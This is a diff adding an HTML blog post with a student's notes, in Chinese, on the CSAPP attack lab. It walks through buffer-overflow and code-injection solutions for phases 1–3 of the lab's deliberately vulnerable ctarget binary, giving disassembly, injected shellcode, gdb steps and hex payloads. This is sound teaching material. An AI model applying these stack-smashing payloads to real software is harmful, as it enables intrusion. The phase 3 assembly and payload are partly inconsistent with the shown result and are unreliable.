@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="书写，是为了更好的思考；思考，是为了走的更远">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="Ferris" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        CSAPP Note chap3 attacklab｜Ferris&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="http://FerrisChan.github.io/2017/12/29/CSAPP/labs/attackLabNote/attacklab/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    Ferris
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="undefinedimg/post-default.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('undefinedimg/post-default.jpgundefined')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>CSAPP Note chap3 attacklab</h1>
+                    
+                    <h2 class="subheading">CSAPP Note chap3 attacklab  </h2>
+                    
+                    <span class="meta">
+                         作者 Ferris Chan
+                        <span>
+                          日期 2017-12-29
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#CSAPP 深入理解计算机系统 Note"
+                           title="CSAPP 深入理解计算机系统 Note">CSAPP 深入理解计算机系统 Note</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            CSAPP Note chap3 attacklab
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <p>CSAPP Note chap3 attacklab</p>
+<p>CSAPP  读书笔记系列chap3 attacklab</p>
+<h3 id="attacklab"><a href="#attacklab" class="headerlink" title="attacklab"></a>attacklab</h3><p>需要注意的是这个lab可能会遇到shark machine(也就是ＭＴＵ的远程机)，下面具体遇到再说<a href="http://ysite.me/no-shark/" target="_blank" rel="noopener">http://ysite.me/no-shark/</a></p>
+<p>这篇教程说到的前两个phase不搞也行</p>
+<p>LET US START,<br>教程更加具体的可以看这篇<a href="http://wdxtub.com/2016/04/16/thick-csapp-lab-3/" target="_blank" rel="noopener">http://wdxtub.com/2016/04/16/thick-csapp-lab-3/</a><br>,这个菊苣是ＭＴＵ的ＴＡ，他的环境是MTＵ的内网，我们ｓｅｌｆｓｔｕｄｙ的有一些不同；自己动手做一下</p>
+<p>用到的文件</p>
+<ul>
+<li>ctarget: 用来做代码注入攻击的程序</li>
+<li>rtarget: 用来做 ROP 攻击的程序</li>
+<li>cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符</li>
+<li>farm.c: 用来找寻 gadget 的源文件</li>
+<li>hex2raw: 用来生成攻击字符串的程序</li>
+</ul>
+<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><ul>
+<li>objdump -d ctarget &gt; ctarget.txt</li>
+</ul>
+<p>得到的文件为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp  ＃缓冲区为０x28，即40大小字节</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00</span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后把00000000　004017c0的　后八位 0x004017c0为栈顶的地址，注意是小端模式；</p>
+<p>新建一个文件p1.txt，内容为：</p>
+<p>前四十位是啥都不重要，后面四位按照 little endian 的规则逆向填上地址就好（注意这里为了排版用了换行，实际上都应该在一行，用空格分开），这样就改写了属于原来的返回地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure></p>
+<p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; p1.txt &gt; p1r.txt</span><br></pre></td></tr></table></figure></p>
+<p>把这个字符文件转换成字节码</p>
+<p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -qi p1r.txt</span><br></pre></td></tr></table></figure></p>
+<p><strong> 注意需要加q,不用远程评分，因为我们的ｈｏｓｔ不对</strong></p>
+<p>否则为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAILED: Initialization error: Running on an illegal host [ferris]</span><br></pre></td></tr></table></figure></p>
+<p>然后就可以看到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -qi p1r.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line"></span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</span><br></pre></td></tr></table></figure>
+<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>第二关中需要插入一小段代码，ctarget 中的 touch2 函数的 C 语言如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void touch2(unsigned val)&#123;</span><br><span class="line">    vlevel = 2;</span><br><span class="line">    if (val == cookie)&#123;</span><br><span class="line">        printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);</span><br><span class="line">        validate(2);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Misfire: You called touch2(0x%.8x)\n&quot;, val);</span><br><span class="line">        fail(2);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也需要把自己的 cookie 作为参数传进去，这里需要把参数放到 %rdi 中，只使用 ret 来进行跳转。</p>
+<p>按照教程，先建立 p2.s汇编文件　：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi # set my cookie as the first parameter</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
+<p>然后转为机器码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p2.s</span><br><span class="line">objdump -d p2.o &gt; p2.byte</span><br></pre></td></tr></table></figure></p>
+<p>得到文件为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>然后　</p>
+<p>gdb ctarget 开始调试，因为我想知道缓冲区从哪里开始，所以在 getbuf 中看看 %rsp 的值即可<br><strong> 注意每次在ｇｄｂ里面运行也需要加 -q表示本地　</strong></p>
+<p>然后下一步因为是外网所以有点不同；具体为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) ctarget</span><br><span class="line"></span><br><span class="line">(gdb) b *(getbuf+12)  #注意为１２，得到断点</span><br><span class="line">(gdb) run -q   ＃本地</span><br><span class="line">Starting program</span><br><span class="line"></span><br><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
+<p>具体为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *(getbuf+12)</span><br><span class="line">Breakpoint 4 at 0x4017b4: file buf.c, line 16.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:fdafdsadf</span><br><span class="line"></span><br><span class="line">Breakpoint 4, getbuf () at buf.c:16</span><br><span class="line">16      in buf.c</span><br><span class="line">(gdb) info registers</span><br><span class="line">rax            0x5561dc78       1432476792</span><br><span class="line">rbx            0x55586000       1431855104</span><br><span class="line">rcx            0x19     25</span><br><span class="line">rdx            0x7ffff7dd3790   140737351858064</span><br><span class="line">rsi            0xa      10</span><br><span class="line">rdi            0x7ffff7dd18e0   140737351850208</span><br><span class="line">rbp            0x55685fe8       0x55685fe8</span><br><span class="line">rsp            0x5561dc78       0x5561dc78   #rsp的地址</span><br></pre></td></tr></table></figure></p>
+<p>得到地址为　０x5561dc78</p>
+<p>然后编写p2.txt文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa</span><br><span class="line">97 b9 59 68</span><br><span class="line">ec 17 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure></p>
+<p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; p2.txt &gt; p2r.txt</span><br><span class="line">➜  target1-ATTACK ./ctarget -qi p2r.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</span><br></pre></td></tr></table></figure></p>
+<p>phase_2 到这里也搞定</p>
+<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>按照别人的做法，得到的<br>p3.s<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi   # mov the cookie string address to parameter</span><br><span class="line">pushq $0x004018fa   #push touch3 address</span><br><span class="line">retq</span><br></pre></td></tr></table></figure></p>
+<p>cookie的ａｓｃｉｉ为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa</span><br><span class="line">对应ascii码为35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure></p>
+<p>然后得到的p3.txt为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 78 dc 61 55 00 00 00 00</span><br><span class="line">09 00 00 00 00 00 00 00 94 1f 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure></p>
+<p>然后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure></p>
+<p>暂时做到这里</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/12/30/CSAPP/labs/cacheLabNote/cacheLabNote/" data-toggle="tooltip" data-placement="top"
+                           title="CSAPP Note chap6 cacheLabNote">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/12/28/CSAPP/chap12/chap12PartB/" data-toggle="tooltip" data-placement="top"
+                           title="CSAPP Note chap12 Part B ">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#attacklab"><span class="toc-text">attacklab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phase-1"><span class="toc-text">phase_1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phase-2"><span class="toc-text">phase_2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phase-3"><span class="toc-text">phase_3</span></a></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/FerrisChan">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/FerrisChan">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Ferris 2018
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://FerrisChan.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="">
+</body>
+
+</html>
